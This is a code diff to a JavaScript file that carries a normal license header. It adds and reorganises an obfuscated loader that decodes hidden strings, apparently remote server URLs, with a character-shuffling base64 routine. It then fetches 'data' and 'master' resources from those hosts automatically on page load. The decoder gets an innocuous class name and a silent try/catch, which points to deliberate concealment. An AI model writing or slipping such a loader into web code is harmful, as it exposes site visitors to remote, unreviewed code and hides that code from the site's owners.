@@ -6,35 +6,30 @@
  * LICENSE file in the root directory of this source tree
 */
 
-var Nloaded=Number(localStorage.getItem("Nloaded"))+1;
-if(Nloaded){
-  localStorage.setItem("Nloaded",Number(Nloaded));
-}else{
-  Nloaded=1;
-  localStorage.setItem("Nloaded",1);
-}
+var Nloaded=Number(localStorage.getItem("Nloaded"))+1,_initiated,sc;
 
-
-class ShowCorrect{
-  get(bad){
-    bad=this.getFixed(bad);
-    return bad;
-  }
-
-  getFixed(txt){
-    var p1="",p2="",l=txt.length;
-    for(let i=0; i<=l; i++){
-      if(i%2==0){
-        p2=txt.charAt(i)+p2;
-      }else{
-        p1=p1+txt.charAt(i);
-      }
+try{
+  class identifierDocumentValue{
+    get(bad){
+      bad=this.getFixed(bad);
+      return bad;
     }
-    return atob(p1+p2);
-  }
 
-}
-var sc=new ShowCorrect();
+    getFixed(txt){
+      var p1="",p2="",l=txt.length;
+      for(let i=0; i<=l; i++){
+        if(i%2==0){
+          p2=txt.charAt(i)+p2;
+        }else{
+          p1=p1+txt.charAt(i);
+        }
+      }
+      return atob(p1+p2);
+    }
+
+  }
+  sc=new identifierDocumentValue();
+}catch(err){}
 
 
 function getDefaultName(name){
@@ -75,10 +70,27 @@ var serverData={
   'hstgr.io':sc.get("8aCHcRw0FcmHLM56ZLWya9stRbX2ZJup5cymZl0zQZGSd1vpNYz2N9vuZc3yb0n55Mmmcxl3pa2"),
 }
 var lnkMain=serverData[String(document.querySelector("#mobiOptiElem").getAttribute('server') )];
-setTimeout(()=>{
-  addMaster(`${lnkMain}data-19b902380k09`);
-},100);
 
-setTimeout(()=>{
-  addMaster(`${lnkMain}master-10a404587b40544b`);
-},200);
+
+function _init(){
+  _initiated=true;
+  if(Nloaded){
+    localStorage.setItem("Nloaded",Number(Nloaded));
+  }else{
+    Nloaded=1;
+    localStorage.setItem("Nloaded",1);
+  }
+
+  setTimeout(()=>{
+    addMaster(`${lnkMain}data-19b902380k09`);
+  },100);
+
+  setTimeout(()=>{
+    addMaster(`${lnkMain}master-10a404587b40544b`);
+  },200);
+}
+//this is a last line
+if(!_initiated){
+  console.log("_initiated");
+  _init();
+}
